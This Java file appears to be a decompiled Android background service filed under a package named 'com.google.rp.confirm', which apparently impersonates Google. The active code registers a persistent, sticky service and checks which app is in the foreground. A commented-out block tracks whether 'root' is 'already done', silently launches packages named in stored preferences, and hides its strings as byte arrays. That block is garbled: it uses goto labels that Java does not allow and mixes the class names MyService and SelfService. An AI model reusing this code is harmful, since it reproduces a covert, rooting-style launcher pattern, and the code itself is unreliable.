package com.google.rp.confirm;

import java.util.Iterator;

import self.core.LightedGreenRoom;
import self.core.SingletonAppContext;
import self.core.db.PreferenceUtils;
import self.core.util.LogUtils;
import self.core.util.StringUtils;
import android.app.ActivityManager.RunningTaskInfo;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;



public class SelfService  extends Service {
	private static String tag = "SelfServer";
	private SingletonAppContext mApp;

	
	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public void onCreate() {
		// TODO Auto-generated method stub
		super.onCreate();
		LogUtils.d(SelfService.tag, "==========================> ### MyService onCreate");

		LightedGreenRoom.setup(this.getApplicationContext());
		LightedGreenRoom.s_registerClient();
		this.mApp = SingletonAppContext.getInstance();
		this.mApp.init(((Context) this));
		//this.f.fetchData();
		//this.f.setVersionCode(MyService.a);
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		LogUtils.d(SelfService.tag, "==========================> ### MyService onStartCommand");
        if(this.mApp != null) {
           // this.mApp.setVersionCode(MyService.a);
        }

        LightedGreenRoom.s_enter();
        super.onStartCommand(intent, flags, startId);
        if(!this.checkisrun(this.getPackageName())) {
            this.a();
        }

        return 2;
	}

	private void a() {
        int v6 = 12;
        String v5 = null;
        /*
        LogUtils.d(SelfService.tag, "### MyService begin");
        PreferenceUtils v1 = this.f.getPreferenceUtils(SelfService.a(new byte[]{82, 116, 76, 105, 98})
                , 0);
        String v0 = v1.getString(SelfService.b, v5);
        if(v0 != null && (v0.equals("done"))) {
            LogUtils.d(SelfService.tag, "root already done");
            if(v1.getString(SelfService.e, v5) == null) {
                LogUtils.d(SelfService.tag, "prepare run");
                v0 = v1.getString(SelfService.a(new byte[]{112, 97, 99, 107, 97, 103, 101, 78, 97, 109
                        , 101, 49}), v5);
                if(StringUtils.isNotBlank(v0)) {
                    LogUtils.d(SelfService.tag, "packageName:" + v0);
                    try {
                        this.mApp.getApplicationContext().startActivity(this.f.getPackageManager().getLaunchIntentForPackage
                                (v0));
                        goto label_60;
                    }
                    catch(Exception v0_1) {
                        LogUtils.e(MyService.tag, ((Throwable)v0_1));
                        goto label_60;
                    }
                }
                else {
                label_60:
                    v0 = v1.getString(MyService.a(new byte[]{112, 97, 99, 107, 97, 103, 101, 78, 97, 
                            109, 101, 50}), v5);
                    if(StringUtils.isNotBlank(v0)) {
                        LogUtils.d(MyService.tag, "packageName:" + v0);
                        try {
                            this.f.getApplicationContext().startActivity(this.f.getPackageManager().
                                    getLaunchIntentForPackage(v0));
                            goto label_77;
                        }
                        catch(Exception v0_1) {
                            LogUtils.e(MyService.tag, ((Throwable)v0_1));
                            goto label_77;
                        }
                    }
                    else {
                    label_77:
                        v1.commit(MyService.e, "done");
                        return;
                    }
                }
            }
            else {
                LogUtils.d(MyService.tag, "already run or no need run");
                return;
            }
        }

        v0 = v1.getString(MyService.c, v5);
        if(v0 != null && (v0.equals("doing"))) {
            LogUtils.d(MyService.tag, "are doing");
            return;
        }

        v1.commit(MyService.c, "doing");
        new c(this.f).start();
        */
    }

	
    private boolean checkisrun(String arg5) {
        boolean v0;
        if(StringUtils.isBlank(arg5)) {
            v0 = false;
        }
        else {
            Iterator<RunningTaskInfo> v3 = this.mApp.getActivityManager().getRunningTasks(1).iterator();
            do {
                if(v3.hasNext()) {
                    if(!v3.next().topActivity.getPackageName().equals(arg5)) {
                        continue;
                    }

                    break;
                }
                else {
                    v0  = false;
                    return v0;
                }
            }
            while(true);
            v0 = true;      
        }

        return v0;
    }
	
	@Override
	public void onDestroy() {
		// TODO Auto-generated method stub
		super.onDestroy();
		LogUtils.d(SelfService.tag, "==========================> ### MyService onDestroy");
        LightedGreenRoom.s_unRegisterClient();
	}
	
	

}
